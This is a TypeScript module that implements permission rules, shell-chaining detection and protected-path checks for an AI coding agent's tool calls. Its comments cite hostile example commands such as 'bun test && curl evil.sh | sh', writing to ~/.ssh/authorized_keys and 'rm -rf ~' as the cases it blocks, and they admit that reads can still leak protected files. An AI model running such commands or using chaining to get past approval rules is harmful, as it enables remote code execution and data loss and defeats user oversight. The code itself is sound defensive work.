import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { randomUUID } from "node:crypto";

// Claude Code-style permission rules, per project: "Write", "Edit",
// "Bash(bun test:*)" — a bare tool name allows the tool, a parenthesized
// specifier allows matching inputs only (":*" = prefix at a token/segment
// boundary, otherwise exact).
// `reason` distinguishes an affirmative user deny from a timeout/abort so
// callers don't misreport a non-answer as a refusal.
export type PermissionDecision = {
  behavior: "allow" | "deny";
  always?: boolean;
  reason?: "timeout" | "aborted" | "coalesced";
};

type PendingRequest = {
  project: string;
  rule: string;
  resolve: (d: PermissionDecision) => void;
  timer: ReturnType<typeof setTimeout>;
};

// globalThis so pendings survive Next dev HMR module reloads.
const g = globalThis as unknown as { __telarPending?: Map<string, PendingRequest> };
const pending = (g.__telarPending ??= new Map());

// Lazy so a test (or a reconfigured process) can point TELAR_HOME elsewhere.
const telarHome = () => process.env.TELAR_HOME ?? path.join(os.homedir(), ".telar");
const rulesFile = () => path.join(telarHome(), "permissions.json");

function atomicWrite(file: string, data: string) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const tmp = file + ".tmp";
  fs.writeFileSync(tmp, data);
  fs.renameSync(tmp, file);
}

function readAll(): Record<string, { allow: string[] }> {
  try {
    return JSON.parse(fs.readFileSync(rulesFile(), "utf8"));
  } catch {
    return {};
  }
}

export function readRules(project: string): string[] {
  return readAll()[project]?.allow ?? [];
}

export function addRule(project: string, rule: string): void {
  const all = readAll();
  const entry = (all[project] ??= { allow: [] });
  if (entry.allow.includes(rule)) return;
  entry.allow.push(rule);
  atomicWrite(rulesFile(), JSON.stringify(all, null, 2));
}

export function removeRule(project: string, rule: string): void {
  const all = readAll();
  const entry = all[project];
  if (!entry) return;
  entry.allow = entry.allow.filter((r) => r !== rule);
  atomicWrite(rulesFile(), JSON.stringify(all, null, 2));
}

// Leading "VAR=value" environment assignments (PORT=3100 bun run dev) don't
// name the command — skip them when picking what to group the rule by.
const ENV_ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/;
// The specifier for a rule derived from a tool call: for Bash, the command
// name plus its second raw token (if any); the bare tool name for everything
// else. The second token is folded in unconditionally — NOT only when it
// looks like a subcommand word (letters/dashes). Gating on that ("git log"
// folds, "-rf" or "/path" doesn't) sounds like it only affects generalization,
// but it means any command invoked with a flag, path, or quoted argument as
// its second token — i.e. almost every real invocation — collapses to a bare
// "Bash(<cmd>:*)" rule with NO argument constraint at all: approving a single
// scoped `rm -rf ./node_modules/.cache` would silently persist a rule that
// also matches `rm -rf ~`. Folding the raw second token always, like the
// pre-existing on-disk rule format, keeps the rule scoped to what was
// actually approved; it's narrower and "always allow" won't stick across
// differently-argued invocations, but that's the correct tradeoff.
export function ruleFor(toolName: string, input: Record<string, unknown>): string {
  if (toolName === "Bash" && typeof input.command === "string") {
    const tokens = input.command.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (i < tokens.length && ENV_ASSIGN.test(tokens[i])) i++;
    const rest = tokens.slice(i);
    if (rest.length === 0) {
      // Empty command, or nothing but env assignments — there's no command
      // name to group by. A bare "Bash" rule would allow ANY command, so
      // fall back to the old exact-two-token grouping instead: narrow, but
      // safe.
      const head = tokens.slice(0, 2).join(" ");
      return `Bash(${head}:*)`;
    }
    const [name, second] = rest;
    const head = second ? `${name} ${second}` : name;
    return `Bash(${head}:*)`;
  }
  return toolName;
}

// Parse "Tool" | "Tool(spec)" without a strict char class so MCP tool names
// (mcp__x__y) and specs containing "(" survive.
function parseRule(rule: string): { tool: string; spec: string | null } | null {
  const open = rule.indexOf("(");
  if (open === -1) return rule ? { tool: rule, spec: null } : null;
  if (!rule.endsWith(")")) return null;
  return { tool: rule.slice(0, open), spec: rule.slice(open + 1, -1) };
}

// Shell separators/substitution/redirection that chain or divert a second
// command/target onto the first: ; & | ` newline, $( ), and < > (which also
// covers << heredocs and <( )/>( ) process substitution). A prefix rule like
// "bun test:*" must never match across one of these — otherwise "bun test &&
// curl evil.sh | sh" would be silently authorized by an "always allow" the
// user gave for "bun test". Redirection is included because a per-command
// rule like "Bash(cat:*)" would otherwise let `cat file > ~/.ssh/authorized_keys`
// through unprompted — no chain keyword needed, just an output target.
const SHELL_CHAIN = /[;&|`\n<>]|\$\(/;

// Prefix match at a token boundary: "bun test" matches "bun test x" but not
// "bun tester", and never matches a command that chains on a second command
// via a shell separator (see SHELL_CHAIN). Tokenizing also absorbs
// incidental extra whitespace.
function tokenPrefix(prefix: string, target: string): boolean {
  if (SHELL_CHAIN.test(target)) return false;
  const p = prefix.trim().split(/\s+/).filter(Boolean);
  const t = target.trim().split(/\s+/).filter(Boolean);
  if (!p.length || t.length < p.length) return false;
  return p.every((tok, i) => t[i] === tok);
}

// Prefix match at a path-segment boundary: "src" matches "src/a.ts" but not
// "srcx". Segments are compared after normalization so "./" and trailing
// slashes don't matter.
function pathPrefix(prefix: string, target: string): boolean {
  const norm = (s: string) => s.replace(/\/+$/, "").split("/").filter((seg) => seg && seg !== ".");
  const p = norm(prefix);
  const t = norm(target);
  if (!p.length || t.length < p.length) return false;
  return p.every((seg, i) => t[i] === seg);
}

export function ruleMatches(rule: string, toolName: string, input: Record<string, unknown>): boolean {
  const parsed = parseRule(rule);
  if (!parsed || parsed.tool !== toolName) return false;
  if (parsed.spec === null) return true; // bare tool name → allow the tool
  const isCommand = typeof input.command === "string";
  const target = isCommand
    ? (input.command as string)
    : inputPaths(input)[0] ?? "";
  if (parsed.spec.endsWith(":*")) {
    const prefix = parsed.spec.slice(0, -2);
    if (!prefix) return false;
    return isCommand ? tokenPrefix(prefix, target) : pathPrefix(prefix, target);
  }
  return target === parsed.spec;
}

// Tool inputs that name a file, in priority order — Write/Edit/MultiEdit use
// file_path, NotebookEdit uses notebook_path.
const PATH_KEYS = ["file_path", "notebook_path", "path"];
export function inputPaths(input: Record<string, unknown>): string[] {
  return PATH_KEYS.map((k) => input[k]).filter(
    (v): v is string => typeof v === "string" && v.length > 0,
  );
}

// Resolve symlinks as far up the tree as they exist. A tool's target may not
// exist yet (e.g. Write creating a new file), so this walks up to the first
// existing ancestor, realpath's that, then rejoins the remaining segments —
// a symlinked ancestor directory still gets caught even for a new file.
function realpathOrSelf(p: string): string {
  try {
    return fs.realpathSync(p);
  } catch {
    const parent = path.dirname(p);
    if (parent === p) return p;
    // Not a real dynamic-import/require path — a bounded upward walk over an
    // already-resolved absolute path. Silences Turbopack's whole-project
    // filesystem-tracing warning, which doesn't apply here.
    return path.join(/*turbopackIgnore: true*/ realpathOrSelf(parent), path.basename(p));
  }
}

// True when `target` (a tool's file path, absolute or relative to `root`)
// resolves to, or lands inside, one of the project's protected paths. Both
// sides are resolved against `root` and then through realpath, so ../
// traversal, trailing slashes, absolute-vs-relative mismatches, and a
// symlink planted inside the repo that points at a protected file all
// reduce to a canonical comparison.
// NOTE: this only guards writes (called from the Write/Edit/etc branch of
// canUseTool). Read/Grep/Glob are pre-allowed and never path-checked, so a
// protected file's *contents* can still be read and later exfiltrated via an
// approved Bash command — protectedPaths stops modification, not disclosure.
export function isProtectedPath(root: string, protectedPaths: string[], target: string): boolean {
  if (!target) return false;
  const abs = realpathOrSelf(path.resolve(root, target));
  return protectedPaths.some((p) => {
    if (!p) return false;
    const base = realpathOrSelf(path.resolve(root, p));
    return abs === base || abs.startsWith(base + path.sep);
  });
}

// Bash carries its target in `command`, not in a path field, so
// isProtectedPath(inputPaths(...)) never sees it — protectedPaths would
// otherwise be silently bypassed by e.g. Bash(rm -rf .env). This is a
// best-effort static check: split the command on whitespace/shell
// metacharacters and test every resulting word as a candidate path. It
// cannot see through variable expansion or obfuscation, but it catches the
// direct case, which is what "always allow bun test" style rules would
// otherwise let through unchecked.
const BASH_WORD_SPLIT = /[\s;&|><$`"'(){}]+/;
export function bashTouchesProtectedPath(root: string, protectedPaths: string[], command: string): boolean {
  if (!protectedPaths.length) return false;
  return command
    .split(BASH_WORD_SPLIT)
    .filter(Boolean)
    .some((word) => isProtectedPath(root, protectedPaths, word));
}

export function createPending(
  project: string,
  rule: string,
  timeoutMs = 120_000,
): { id: string; promise: Promise<PermissionDecision> } {
  let id = "perm_" + randomUUID();
  while (pending.has(id)) id = "perm_" + randomUUID(); // paranoia: randomUUID collisions are not realistic
  const promise = new Promise<PermissionDecision>((resolve) => {
    const timer = setTimeout(() => {
      pending.delete(id);
      resolve({ behavior: "deny", reason: "timeout" });
    }, timeoutMs);
    pending.set(id, { project, rule, resolve, timer });
  });
  return { id, promise };
}

export function resolvePending(id: string, decision: PermissionDecision): boolean {
  const p = pending.get(id);
  if (!p) return false;
  clearTimeout(p.timer);
  pending.delete(id);
  p.resolve(decision);
  // "Always allow" persists a rule that covers every other tool call already
  // waiting on the same project+rule — resolve those too instead of making
  // them sit out the prompt (or the 120s timeout) for a rule the user just
  // approved. The rule itself is persisted by the caller of resolvePending
  // (route.ts, keyed off `decision.always`), not here.
  if (decision.behavior === "allow" && decision.always) {
    for (const [otherId, other] of pending) {
      if (other.project === p.project && other.rule === p.rule) {
        clearTimeout(other.timer);
        pending.delete(otherId);
        other.resolve({ behavior: "allow", reason: "coalesced" });
      }
    }
  }
  return true;
}
